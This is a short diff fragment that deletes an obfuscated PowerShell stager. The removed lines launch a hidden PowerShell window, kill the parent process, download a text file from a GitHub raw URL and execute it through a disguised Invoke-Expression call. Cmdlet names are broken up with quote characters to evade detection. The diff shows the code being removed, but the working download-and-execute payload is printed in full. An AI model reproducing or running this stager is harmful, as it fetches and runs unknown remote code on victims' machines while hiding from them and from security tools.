@@ -1,7 +1,0 @@
-Star''t-''Process $PSHOME\powershell.exe -ArgumentList {
-$c217e85661a640bcb182011859488243= (Get-CimInstance Win32_Process -Filter "ProcessId = $PID").ParentProcessId;
-S''t''o''p''-P''r''o''c''es''s -Id $c217e85661a640bcb182011859488243 -Force;
-${g}=[char[]](New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dok72/dok72.github.io/main/soloemapuoaccedere/second.txt');
-ie''x(${g}-join'');
-&{Sta''rt-''S''leep -s 1.2;
-$35c823eed4e34387b2aa3a8961a3fc42='SilentlyContinue'}} -WindowStyle Hidden
